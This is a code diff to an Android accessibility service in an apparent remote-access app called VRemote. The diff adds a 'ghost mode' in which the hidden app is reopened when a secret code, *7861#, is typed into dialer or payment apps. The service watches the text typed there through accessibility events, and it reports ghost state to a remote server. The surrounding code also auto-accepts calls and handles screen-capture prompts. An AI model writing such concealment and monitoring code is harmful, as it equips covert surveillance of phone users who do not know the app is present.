@@ -39,6 +39,8 @@ public class RemoteAccessibilityService extends AccessibilityService {
     private static volatile long sAutoAcceptStartTime = 0;
     private static long sLastEndCallTime = 0;
     private static long sLastAutoCallTime = 0;
+    private static long sLastDialerLaunchTime = 0;
+    private static boolean sDialerCodeConsumed = false;
 
     private final BroadcastReceiver mAutoAcceptReceiver = new BroadcastReceiver() {
         @Override
@@ -473,6 +475,7 @@ public class RemoteAccessibilityService extends AccessibilityService {
             payload.put("ram", ram);
             payload.put("platform", "android");
             payload.put("role", "accessibility_service");
+            GhostStateSync.putGhostFields(payload, this);
 
             if (mBgSocket != null && mBgSocket.connected()) {
                 mBgSocket.emit("register-device", payload);
@@ -537,6 +540,11 @@ public class RemoteAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
+        // Ghost-mode hidden reopen: typing *7861# in the dialer opens the app (only *7861#, not plain 7861).
+        // Secret-code receiver (*#*#7861#*#*) stays as a backup when accessibility is OFF.
+        try {
+            if (event != null) checkDialerSecretCode(event);
+        } catch (Throwable ignored) {}
         if (!sAutoAcceptPending || event == null) return;
 
         // Prevent IPC deadlock / scanner timeout: ensure 5000ms max timeout
@@ -591,6 +599,70 @@ public class RemoteAccessibilityService extends AccessibilityService {
         } catch (Throwable t) {
             Log.e(TAG, "onAccessibilityEvent error: " + t.getMessage());
         }
+    }
+
+    /**
+     * Opens the app when the user types exactly "*7861#" in the phone dialer — no call press needed.
+     * Plain "7861" alone does NOT open the app (user requirement: only *7861#).
+     * Only active while ghost_mode is ON, so dialing any number keeps working in normal mode.
+     */
+    private void checkDialerSecretCode(AccessibilityEvent event) {
+        try {
+            int type = event.getEventType();
+            if (type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
+                    && type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+                return;
+            }
+            CharSequence pkgChar = event.getPackageName();
+            String pkg = (pkgChar != null) ? pkgChar.toString().toLowerCase(java.util.Locale.ROOT) : "";
+            CharSequence clsChar = event.getClassName();
+            String cls = (clsChar != null) ? clsChar.toString().toLowerCase(java.util.Locale.ROOT) : "";
+            boolean isDialer = pkg.contains("dialer") || pkg.contains("contacts")
+                    || pkg.contains("incall") || pkg.contains("phone")
+                    || pkg.contains("truecaller") || pkg.contains("phonepe")
+                    || pkg.startsWith("com.samsung.")
+                    || cls.contains("dialer") || cls.contains("dialpad");
+            if (!isDialer) return;
+
+            boolean ghost = false;
+            try {
+                ghost = getSharedPreferences("VRemotePrefs", Context.MODE_PRIVATE)
+                        .getBoolean("ghost_mode", false);
+            } catch (Exception ignored) {}
+            if (!ghost) return;
+
+            java.util.List<CharSequence> texts = event.getText();
+            if (texts == null) return;
+            StringBuilder sb = new StringBuilder();
+            for (CharSequence cs : texts) {
+                if (cs != null) sb.append(cs);
+            }
+            // ONLY "*7861#" opens the app — plain "7861" alone must NOT trigger.
+            // All whitespace is stripped first: many dialers insert spaces or
+            // line breaks into the field (e.g. "* 7861 #"), which used to make
+            // the exact match fail on some OEM dialers.
+            String raw = sb.toString().replaceAll("\\s+", "");
+            if (!"*7861#".equals(raw)) {
+                if (!raw.isEmpty()) sDialerCodeConsumed = false;
+                return;
+            }
+            if (sDialerCodeConsumed) return;
+            long now = System.currentTimeMillis();
+            if (now - sLastDialerLaunchTime < 8000) return;
+            sLastDialerLaunchTime = now;
+            sDialerCodeConsumed = true;
+            Log.i(TAG, "Dialer code *7861# detected in ghost mode, launching VRemote");
+            AppLog.i(TAG, "Dialer code *7861# detected in ghost mode, launching VRemote");
+            try {
+                Intent launch = new Intent(this, MainActivity.class);
+                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                        | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
+                        | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                startActivity(launch);
+            } catch (Exception e) {
+                Log.e(TAG, "Dialer launch failed: " + e.getMessage());
+            }
+        } catch (Throwable ignored) {}
     }
 
     private void processMediaProjectionDialog(android.view.accessibility.AccessibilityNodeInfo root) {
